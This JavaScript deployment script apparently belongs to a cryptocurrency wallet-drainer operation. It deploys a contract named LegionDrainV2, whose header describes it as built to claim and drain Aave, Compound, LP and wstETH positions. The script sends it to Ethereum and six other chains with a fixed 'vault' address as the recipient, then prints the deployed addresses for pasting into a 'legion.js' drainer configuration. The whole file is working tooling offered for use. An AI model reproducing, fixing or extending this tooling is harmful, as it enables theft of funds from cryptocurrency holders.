/**
 * Deploy LegionDrainV2 (DeFi-aware — Aave/Compound/LP/wstETH + claim + drain)
 *
 *   set DEPLOYER_KEY=0x...
 *   set VAULT_ADDRESS_EVM=0x2B20979118a61aE3f7f75F3320FB9b0639c5BA53
 *   node contracts/deploy-legion-drain.mjs
 */
import { execSync } from 'child_process';
import { readFileSync, writeFileSync, mkdtempSync, rmSync, readdirSync } from 'fs';
import path from 'path';
import { fileURLToPath, pathToFileURL } from 'url';
import os from 'os';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const ROOT = path.resolve(__dirname, '..');

const nobleBase = path.join(ROOT, 'node_modules/.pnpm/@noble+curves@1.9.7/node_modules/@noble/curves/esm');
const nobleHashBase = path.join(ROOT, 'node_modules/.pnpm/@noble+hashes@1.8.0/node_modules/@noble/hashes/esm');
const { secp256k1 } = await import(pathToFileURL(path.join(nobleBase, 'secp256k1.js')).href);
const { keccak_256 } = await import(pathToFileURL(path.join(nobleHashBase, 'sha3.js')).href);

const PRIVATE_KEY = process.env.DEPLOYER_KEY?.trim();
if (!PRIVATE_KEY) {
  console.error('Set DEPLOYER_KEY before deploy');
  process.exit(1);
}

const VAULT = (
  process.env.VAULT_ADDRESS_EVM ||
  process.env.SOVEREIGN_VAULT_EVM ||
  '0x2B20979118a61aE3f7f75F3320FB9b0639c5BA53'
).trim();

const KEY_HEX = PRIVATE_KEY.replace('0x', '');

const CHAINS = [
  { id: 1,     name: 'Ethereum', rpc: 'https://ethereum-rpc.publicnode.com',
    weth: '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2' },
  { id: 42161, name: 'Arbitrum', rpc: 'https://arbitrum-one-rpc.publicnode.com',
    weth: '0x82aF49447D8a07e3bd95BD0d56f35241523fBab1' },
  { id: 8453,  name: 'Base', rpc: 'https://base-rpc.publicnode.com',
    weth: '0x4200000000000000000000000000000000000006' },
  { id: 10,    name: 'Optimism', rpc: 'https://optimism-rpc.publicnode.com',
    weth: '0x4200000000000000000000000000000000000006' },
  { id: 56,    name: 'BSC', rpc: 'https://bsc-rpc.publicnode.com',
    weth: '0x2170Ed0880ac9A755fd29B2688956BD959F933E8' },
  { id: 137,   name: 'Polygon', rpc: 'https://polygon-bor-rpc.publicnode.com',
    weth: '0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619' },
  { id: 43114, name: 'Avalanche', rpc: 'https://avalanche-c-chain-rpc.publicnode.com',
    weth: '0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7' },
];

function toChecksumAddress(addr) {
  const a = addr.toLowerCase().replace('0x', '');
  const h = Buffer.from(keccak_256(new TextEncoder().encode(a))).toString('hex');
  return '0x' + a.split('').map((c, i) => (parseInt(h[i], 16) >= 8 ? c.toUpperCase() : c)).join('');
}

function deriveAddress(privKeyHex) {
  const pub = secp256k1.getPublicKey(privKeyHex, false);
  const hash = keccak_256(pub.slice(1));
  return toChecksumAddress('0x' + Buffer.from(hash.slice(-20)).toString('hex'));
}

async function rpc(url, method, params) {
  const res = await fetch(url, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ jsonrpc: '2.0', id: 1, method, params }),
  });
  const d = await res.json();
  if (d.error) throw new Error(d.error.message || JSON.stringify(d.error));
  return d.result;
}

function encodeConstructorArgs(vaultAddr, wethAddr) {
  const v = vaultAddr.replace('0x', '').toLowerCase().padStart(64, '0');
  const w = wethAddr.replace('0x', '').toLowerCase().padStart(64, '0');
  return v + w;
}

function rlpEncode(input) {
  if (Array.isArray(input)) {
    const encoded = input.map(rlpEncode);
    const totalLen = encoded.reduce((s, e) => s + e.length, 0);
    return Buffer.concat([rlpLength(totalLen, 0xc0), ...encoded]);
  }
  const buf = typeof input === 'bigint' ? bigintToBytes(input)
    : typeof input === 'number' ? bigintToBytes(BigInt(input))
    : Buffer.isBuffer(input) ? input
    : input instanceof Uint8Array ? Buffer.from(input) : Buffer.from(input);
  if (buf.length === 1 && buf[0] < 0x80) return buf;
  return Buffer.concat([rlpLength(buf.length, 0x80), buf]);
}

function rlpLength(len, offset) {
  if (len < 56) return Buffer.from([offset + len]);
  const lenBytes = bigintToBytes(BigInt(len));
  return Buffer.concat([Buffer.from([offset + 55 + lenBytes.length]), lenBytes]);
}

function bigintToBytes(n) {
  if (n === 0n) return Buffer.alloc(0);
  const hex = n.toString(16).padStart(2, '0');
  return Buffer.from(hex.length % 2 ? '0' + hex : hex, 'hex');
}

async function signTx(params) {
  const { chainId, nonce, maxPriorityFeePerGas, maxFeePerGas, gasLimit, to, value, data } = params;
  const toField = to ? Buffer.from(to.replace('0x', ''), 'hex') : Buffer.alloc(0);
  const dataField = Buffer.from(data.replace('0x', ''), 'hex');
  const signingData = Buffer.concat([
    Buffer.from([0x02]),
    rlpEncode([chainId, nonce, maxPriorityFeePerGas, maxFeePerGas, gasLimit, toField, value, dataField, []]),
  ]);
  const msgHash = keccak_256(signingData);
  const sig = secp256k1.sign(msgHash, KEY_HEX, { lowS: true });
  const r = Buffer.from(sig.r.toString(16).padStart(64, '0'), 'hex');
  const s = Buffer.from(sig.s.toString(16).padStart(64, '0'), 'hex');
  const v = sig.recovery;
  const rawTx = Buffer.concat([
    Buffer.from([0x02]),
    rlpEncode([chainId, nonce, maxPriorityFeePerGas, maxFeePerGas, gasLimit, toField, value, dataField, [], v, r, s]),
  ]);
  return '0x' + rawTx.toString('hex');
}

console.log('Compiling LegionDrainV2.sol...');
const solFile = path.join(__dirname, 'LegionDrainV2.sol');
const prebuiltBin = path.join(__dirname, 'LegionDrainV2_sol_LegionDrainV2.bin');
let creationBytecode;
if (readFileSync(prebuiltBin, 'utf8').trim().length > 10) {
  creationBytecode = '0x' + readFileSync(prebuiltBin, 'utf8').trim();
  console.log('Using prebuilt bytecode from', path.basename(prebuiltBin));
} else {
  const tmpDir = mkdtempSync(path.join(os.tmpdir(), 'solc-legion-'));
  execSync(`npx solc --optimize --optimize-runs 200 --bin -o "${tmpDir}" "${solFile}"`, {
    encoding: 'utf8', cwd: __dirname,
  });
  const bins = readdirSync(tmpDir).filter((f) => f.endsWith('.bin'));
  if (!bins.length) throw new Error('solc produced no .bin files');
  const binFile = bins.find((f) => f.includes('LegionDrainV2')) || bins[0];
  creationBytecode = '0x' + readFileSync(path.join(tmpDir, binFile), 'utf8').trim();
  try { rmSync(tmpDir, { recursive: true }); } catch {}
}
if (creationBytecode.length <= 2) throw new Error('Empty creation bytecode — run: cd contracts && npx solc --optimize --bin LegionDrainV2.sol -o .');

const vaultCs = toChecksumAddress(VAULT);
const deployer = deriveAddress(KEY_HEX);
console.log('Vault:   ', vaultCs);
console.log('Deployer:', deployer);
console.log('Bytecode:', (creationBytecode.length - 2) / 2, 'bytes\n');

const results = {};
const deployStatePath = path.join(__dirname, 'legion-drain-deploy.json');
try {
  const prior = JSON.parse(readFileSync(deployStatePath, 'utf8'));
  if (prior?.results && typeof prior.results === 'object') {
    for (const [cid, addr] of Object.entries(prior.results)) {
      if (typeof addr === 'string' && addr.startsWith('0x') && addr.length === 42) {
        results[cid] = addr;
      }
    }
  }
} catch {}

for (const chain of CHAINS) {
  const priorAddr = results[chain.id];
  if (typeof priorAddr === 'string' && priorAddr.startsWith('0x') && priorAddr.length === 42) {
    console.log(`─── ${chain.name} (${chain.id}) ───`);
    console.log(`✓ Already deployed: ${priorAddr}\n`);
    continue;
  }
  console.log(`─── ${chain.name} (${chain.id}) ───`);
  const wethCs = toChecksumAddress(chain.weth);
  const deployData = creationBytecode + encodeConstructorArgs(vaultCs, wethCs);

  try {
    const bal = BigInt(await rpc(chain.rpc, 'eth_getBalance', [deployer, 'latest']) || '0x0');
    console.log(`Balance: ${(Number(bal) / 1e18).toFixed(6)}`);
    if (bal === 0n) {
      console.log('⊘ SKIPPED — no gas\n');
      results[chain.id] = 'SKIPPED_NO_GAS';
      continue;
    }

    const nonce = BigInt(await rpc(chain.rpc, 'eth_getTransactionCount', [deployer, 'pending']) || '0x0');
    let maxFeePerGas, maxPriorityFeePerGas;
    try {
      const feeData = await rpc(chain.rpc, 'eth_feeHistory', ['0x1', 'latest', [50]]);
      const baseFee = BigInt(feeData.baseFeePerGas?.[0] || '0x0');
      maxPriorityFeePerGas = chain.id === 137 ? 30000000000n : 1500000000n;
      maxFeePerGas = baseFee * 2n + maxPriorityFeePerGas;
    } catch {
      const gasPrice = BigInt(await rpc(chain.rpc, 'eth_gasPrice', []) || '0x0');
      maxFeePerGas = gasPrice * 2n;
      maxPriorityFeePerGas = chain.id === 137
        ? (gasPrice > 30000000000n ? gasPrice : 30000000000n)
        : gasPrice;
    }

    const gasLimit = 1500000n;
    const rawTx = await signTx({
      chainId: BigInt(chain.id), nonce, maxPriorityFeePerGas, maxFeePerGas,
      gasLimit, to: '', value: 0n, data: deployData,
    });

    const txHash = await rpc(chain.rpc, 'eth_sendRawTransaction', [rawTx]);
    console.log('Tx:', txHash);

    let receipt = null;
    for (let i = 0; i < 40; i++) {
      await new Promise((r) => setTimeout(r, 3000));
      receipt = await rpc(chain.rpc, 'eth_getTransactionReceipt', [txHash]);
      if (receipt) break;
      process.stdout.write('.');
    }

    if (!receipt?.contractAddress) throw new Error('no contract address');
    const addr = toChecksumAddress(receipt.contractAddress);
    console.log(`\n✅ ${addr}\n`);
    results[chain.id] = addr;
  } catch (e) {
    console.error(`❌ ${e.message}\n`);
    results[chain.id] = 'FAILED: ' + e.message;
  }
}

writeFileSync(path.join(__dirname, 'legion-drain-deploy.json'), JSON.stringify({ vault: vaultCs, results }, null, 2));

console.log('\n═══ COPY INTO legion.js → LEGION_DRAIN ═══');
console.log('var LEGION_DRAIN = {');
for (const c of CHAINS) {
  const a = results[c.id];
  const valid = typeof a === 'string' && a.startsWith('0x') && a.length === 42;
  console.log(`  ${c.id}: '${valid ? a : '0x0000000000000000000000000000000000000000'}', // ${c.name}`);
}
console.log('};');
